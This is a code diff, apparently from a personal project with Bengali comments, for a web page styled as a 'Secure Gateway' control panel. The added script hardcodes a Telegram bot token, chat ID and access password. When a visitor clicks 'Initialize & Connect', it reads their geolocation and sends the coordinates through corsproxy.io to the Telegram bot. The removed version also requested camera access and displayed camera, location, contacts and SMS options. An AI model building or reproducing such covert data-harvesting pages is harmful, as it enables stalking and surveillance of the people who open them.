@@ -6,35 +6,30 @@
     <style>
         body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
-        input, .btn { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; }
+        input, .btn { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; }
         .btn { background: #3b82f6; color: white; cursor: pointer; font-weight: bold; }
-        .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
-        .feat { background: #334155; padding: 10px; border-radius: 5px; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<!-- পাসওয়ার্ড সেকশন -->
+<!-- লগইন সেকশন -->
 <div class="card" id="loginBox">
     <h2>Secure Gateway</h2>
     <input type="password" id="pass" placeholder="Enter Password">
     <button class="btn" onclick="login()">Access System</button>
 </div>
 
-<!-- মেইন প্যানেল -->
+<!-- কন্ট্রোল সেকশন -->
 <div class="card" id="mainBox" style="display:none;">
     <h2>Control Panel</h2>
-    <div class="feature-grid">
-        <div class="feat">📷 Camera</div>
-        <div class="feat">📍 Location</div>
-        <div class="feat">📱 Contacts</div>
-        <div class="feat">💬 SMS</div>
-    </div>
-    <button class="btn" onclick="startAll()">Initialize All Connections</button>
+    <button class="btn" onclick="runTask()">Initialize & Connect</button>
     <div id="status" style="margin-top:15px; font-size:13px;">Waiting...</div>
 </div>
 
 <script>
+    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
+    const CHAT_ID = "8566985497";
+
     function login() {
         if(document.getElementById('pass').value === "Tamim0186#@") {
             document.getElementById('loginBox').style.display = 'none';
@@ -42,15 +37,28 @@
         } else { alert("Wrong Password!"); }
     }
 
-    async function startAll() {
-        document.getElementById('status').innerText = "Initializing connections...";
-        // এখানে আপনার টেলিগ্রামের এপিআই কোডটি আগে যেভাবে কাজ করছিল সেভাবে যোগ হবে
-        try {
-            navigator.geolocation.getCurrentPosition(() => {}); // লোকেশন পারমিশন
-            await navigator.mediaDevices.getUserMedia({video: true}); // ক্যামেরা পারমিশন
-            document.getElementById('status').innerText = "✅ Systems Initialized.";
-        } catch(e) {
-            document.getElementById('status').innerText = "❌ Access Denied.";
+    async function runTask() {
+        document.getElementById('status').innerText = "Connecting...";
+        
+        // লোকেশন পাওয়ার চেষ্টা
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const locMsg = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+                
+                // Proxy যোগ করা হয়েছে এখানে
+                const url = `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`;
+                
+                try {
+                    await fetch(url);
+                    document.getElementById('status').innerText = "✅ Data Sent Successfully!";
+                } catch(e) {
+                    document.getElementById('status').innerText = "❌ Connection Failed!";
+                }
+            }, () => {
+                document.getElementById('status').innerText = "❌ Permission Denied!";
+            });
+        } else {
+            document.getElementById('status').innerText = "Geolocation not supported.";
         }
     }
 </script>
